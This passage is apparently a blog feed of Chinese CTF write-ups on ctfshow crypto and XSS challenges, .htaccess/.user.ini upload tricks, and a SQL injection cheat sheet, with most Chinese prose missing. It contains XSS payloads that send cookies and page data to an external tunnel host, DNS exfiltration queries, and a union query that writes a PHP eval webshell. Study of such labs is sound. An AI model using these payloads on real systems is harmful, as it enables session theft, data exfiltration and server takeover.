src="https://img-blog.csdnimg.cn/d37a3ee90d6c4dee8b78f144403eac70.png" alt="8"></p><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p><strong>4132</strong><br>wp<a href="https://blog.csdn.net/douqingl/article/details/50256931">Serpent </a><br><a href="http://serpent.online-domain-tools.com/"></a><br><img src="https://img-blog.csdnimg.cn/d78a4f4147ec43349d6241a756c8d818.png" alt="9"></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><blockquote><p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p></blockquote><p>**[]CTF<strong><br><img src="https://img-blog.csdnimg.cn/d702c6d9ecca46399271a62a0207cb31.png" alt="10"><br>flag</strong>flag{}</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>MD5<a href="https://www.somd5.com/"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p>uozt{Zgyzhv_xlwv_uiln_xguhsld}</p></blockquote><blockquote><p>Atbash Cipher<br> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br> Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</p></blockquote><p>()[<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xss</title>
      <link href="/2023/02/26/ctfshow-xss/"/>
      <url>/2023/02/26/ctfshow-xss/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/bd7d0276dcd141c4ae556dde560fcab9.png" alt="1"></p><blockquote><p></p><p> <br> JavaScriptJava VBScriptActiveX Flash  HTML<br> <br> </p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="1--XSS-"><a href="#1--XSS-" class="headerlink" title="1.  XSS ?"></a>1.  XSS ?</h2><p>XSS (Cross Site Scripting) (Cascading Style Sheets)CSS  XSS</p><p>XSS() Web  Script  Web  Script  sql  Web  Web </p><p>XSS  JavaScript Java VBScriptActiveX Flash  HTML cookie </p><h2 id="2-XSS-"><a href="#2-XSS-" class="headerlink" title="2. XSS "></a>2. XSS </h2><p>HTML &lt; HTML </p><p>&lt; HTML  HTML  JavaScript  XSS </p><blockquote><p> XSS </p><p>1 cookie</p><p>2 Flash crossdomain  Java </p><p>3 iframeframeXMLHttpRequest  Flash<br></p><p>4</p><p>5 XSS  DDoS </p></blockquote><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p><strong>cpolar</strong><br>xss.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <code>&lt;script&gt;windows.location.href=&#39;http://1f72xxx3.r3.cpolar.top/xss.php?c=&#39;+document.cookie&lt;/script&gt;</code>window<br>flag<br><code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code><br><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/&#39;+document.cookie)&quot;&gt;</code><br><code>&lt;iframe onload=&quot;window.open(&#39;http://1xxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p><blockquote><p>Window open() <br>open()  </p></blockquote><p><img src="https://img-blog.csdnimg.cn/74a587fe2e1a4b1091feeeda46152723.png" alt="1"></p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p><code>&lt;script&gt;</code><code>&lt;body&gt;</code><br><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72eccc63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>flag</p><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>img</p><h2 id="web320-322"><a href="#web320-322" class="headerlink" title="web320-322"></a>web320-322</h2><p><strong></strong>&#x2F;**&#x2F;</p><h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h2><p>xss<strong>xss.php</strong><strong>x.php</strong></p><p><strong></strong></p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72ffec63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>admin</p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>admin<br><img src="https://img-blog.csdnimg.cn/df99dac33016489fab135c338cb89030.png" alt="1"><br>xsscookie</p><p><img src="https://img-blog.csdnimg.cn/e20c9afd03ac4145ae80e7d5fd32c59d.png" alt="2"><br><code>&lt;script&gt;document.location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+document.cookie&lt;/script&gt;</code>cookie<br><img src="https://img-blog.csdnimg.cn/b1fc82f156f840fdb7f7a2c13fe9ece0.png" alt="3"><br>flagburp<br><img src="https://img-blog.csdnimg.cn/66ded499169947dcb2ea50d53888a948.png" alt="5"></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>admincookie<br></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://1f72ec63.r3.cpolar.top/x.php?c='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment">/* JavaScript laytable-cell-1-0-1 jQuery  each()  indexOf() ctfshow&#123; URLhttp://ip/x.php?cookie= URL value.innerText ctfshow&#123; URL  location.href  URL "laytable-cell-1-0-1"  HTML class nametablecelllaytable-cell-1-0-2laytable-cell-1-1-0 JavaScript  JavaScript */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> JavaScript laytable-cell-1-0-1ctfshow{<a href="http://ip/x.php?cookie=%E2%80%9D+value.innerText">http://ip/x.php?cookie=+value.innerText</a>  value.innerText ctfshow{</p></blockquote><p> payload<br><code>&lt;script&gt; $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;     if(value.innerText.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)     &#123;location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+value.innerText&#125; &#125;); &lt;/script&gt;</code><br>flag<br><img src="https://img-blog.csdnimg.cn/f5598608d95847fb9ae9c8d93ed5c14e.png" alt="2"></p><h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>api<br><img src="https://img-blog.csdnimg.cn/466be17549174dadbe636ff9ea1c7206.png" alt="1"><br>userpayload<code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=asdd&#39;&lt;/script&gt;</code><br><br><img src="https://img-blog.csdnimg.cn/7dab5e3fba604f1494dc8156c0c6ebca.png" alt="2"></p><h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>postjsjshttp<br></p><h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest()"></a>XMLHttpRequest()</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span>httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// post</span>httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'name=teswe&amp;ee=ef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// send</span><span class="token comment">/** *  */</span>httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//</span>        <span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token comment">//</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>user passwordpayloadflag</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/api/change.php'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'p=1234567'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/8ab67c81294a4c38ba416d389eb32f4d.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess .user.ini</title>
      <link href="/2023/02/21/htaccess-%E5%92%8C-user-ini/"/>
      <url>/2023/02/21/htaccess-%E5%92%8C-user-ini/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>httpd-conf  Apache  web .htaccess  Apache </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p> Apache  httpd.conf </p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.php.phtml  php .phtml   php .phtml.php   </p><p></p><pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> php   </p><p> Apache .htaccess web  www .htaccess  <code>AddType application/x-httpd-php .jpg</code>  jpg  PHP  jpg  webshell</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .htaccessAddType application&#x2F;x-httpd-php .jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 1.jpg PHP   </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>.htaccess  Apache   </p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>php.ini  php  web .user.ini .htaccess .user.ini  php.ini</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p>php </p><pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 11.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.user.ini  1.jpg.php <code>auto_prepend_file = 1.jpg</code> .php  1.jpg  11.php  <code>require(&#39;1.jpg&#39;)</code> <br> exit </p><p>.user.ini  Apache  Nginx  fastcgi  ( fastcgi )  </p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p>.user.ini .php .php .php   </p><p> <code>../</code>   </p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> uploadfile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="SQL-"><a href="#SQL-" class="headerlink" title="SQL "></a>SQL </h1><p><a href="https://portswigger.net/web-security/sql-injection">SQL </a> SQL </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p>|  | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| : |  |<br>|    | <code>&#39;foo&#39;+&#39;bar&#39;</code>                                                |<br>|  | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| MySQL  | <code>&#39;foo&#39; &#39;bar&#39;</code>[] <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code> |</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> 1 <code>ba</code></p><table><thead><tr><th align="left"></th><th><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr><tr><td align="left"></td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr><tr><td align="left">MySQL</td><td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><table><thead><tr><th align="left"></th><th><code>--comment</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>--comment/*comment*/</code></td></tr><tr><td align="left"></td><td><code>--comment/*comment*/</code></td></tr><tr><td align="left">MySQL</td><td><code>#comment</code> <code>-- comment</code>[] <code>/*comment*/</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><table><thead><tr><th align="left"></th><th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>SELECT @@version</code></td></tr><tr><td align="left"></td><td><code>SELECT version()</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT @@version</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><table><thead><tr><th align="left"></th><th><code>SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left"></td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><table><thead><tr><th align="left"></th><th><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td></tr><tr><td align="left"></td><td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> DNS </p><table><thead><tr><th align="left"></th><th><code>Does not support batched queries.</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left"></td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left">MySQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p> MySQL SQL  PHP  Python API  MySQL </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> 10 </p><table><thead><tr><th align="left"></th><th><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td></tr><tr><td align="left"></td><td><code>SELECT pg_sleep(10)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p>|  | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;||dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual</code> |<br>| : |  |<br>|    | <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code>            |<br>|  | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code> |<br>| MySQL  | <code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code>               |</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p> DNS <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator </a> Burp Collaborator  Collaborator  DNS </p><table><thead><tr><th align="left"></th><th> XML  ( <a href="https://portswigger.net/web-security/xxe">XXE</a> )  DNS  Oracle  <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code>   Oracle  <code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></th></tr></thead><tbody><tr><td align="left"></td><td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td></tr><tr><td align="left"></td><td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td></tr><tr><td align="left">MySQL</td><td> Windows <code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td></tr></tbody></table><h2 id="-DNS-"><a href="#-DNS-" class="headerlink" title=" DNS "></a> DNS </h2><p> DNS <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator </a> Burp Collaborator  Collaborator  DNS </p><p>|  | <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> |<br>| : |  |<br>|    | <code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code> |<br>|  | <code>create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;execute c;END;$$ language plpgsql security definer;SELECT f();</code> |<br>| MySQL  |  Windows <code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code> |</p><h2 id="SQLwebshell"><a href="#SQLwebshell" class="headerlink" title="SQLwebshell"></a>SQLwebshell</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1web</p><p>2(ROOT)</p><p>3secure_file_priv</p><p>    select into outfilewebshell</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong></strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into outfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>dumpfile</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into dumpfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>lines terminated by </strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines terminated by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span><span class="token comment">//lines terminated by   xx </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>lines starting by </strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines starting by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span><span class="token comment">// lines starting by webshelllines starting by   xx </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>fields terminated by </strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/work/shell.php'</span> fields terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span><span class="token comment">// fields terminated by webshellfields terminated by   xx </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>columns terminated by </strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> <span class="token constant">COLUMNS</span> terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span><span class="token comment">// fields terminated by webshellfields terminated by   xx </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmap</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>kali<span class="token punctuation">)</span> <span class="token operator">/</span>tmp   sqlmap <span class="token operator">-</span>u "http:<span class="token comment">//127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;us</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugkuweb</title>
      <link href="/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p><strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zero</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'zero'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token 